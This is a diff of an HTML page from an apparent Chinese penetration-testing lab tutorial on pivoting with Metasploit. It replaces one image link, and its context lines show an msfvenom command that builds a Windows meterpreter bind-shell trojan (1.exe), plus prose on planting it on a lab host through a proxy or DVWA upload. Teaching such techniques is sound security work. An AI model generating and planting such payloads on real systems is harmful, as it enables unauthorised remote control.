@@ -641,7 +641,7 @@ run autoroute -p
 <p>然后我们生成一个<code>1.exe</code>的木马文件，我们可以通过代理的方式将该木马文件传至<code>172.1.1.112</code>主机上（也可以通过生成大小马的方式，代理访问<code>DVWA</code>上传木马，再次获得<code>172.1.1.112</code>主机的权限）</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p windows/meterpreter/bind_tcp  lport<span style="color:#f92672">=</span><span style="color:#ae81ff">1080</span> -f exe -o 1.exe
 </code></pre></div><p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714040752.png" alt=""></p>
-<p><img src="C:%5CNutstore%5C999-%E7%AC%94%E8%AE%B0%E5%9B%BE%E7%89%87%5Cimage-20200714035257425.png" alt="image-20200714035257425"></p>
+<p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714043015.png" alt=""></p>
 <p>当目标运行木马以后，然后我们通过代理再次开启<code>msf</code>：</p>
 <p><img src="https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200714025824.png" alt=""></p>
 <p>我们依旧通过<code>msf</code>打进去：</p>
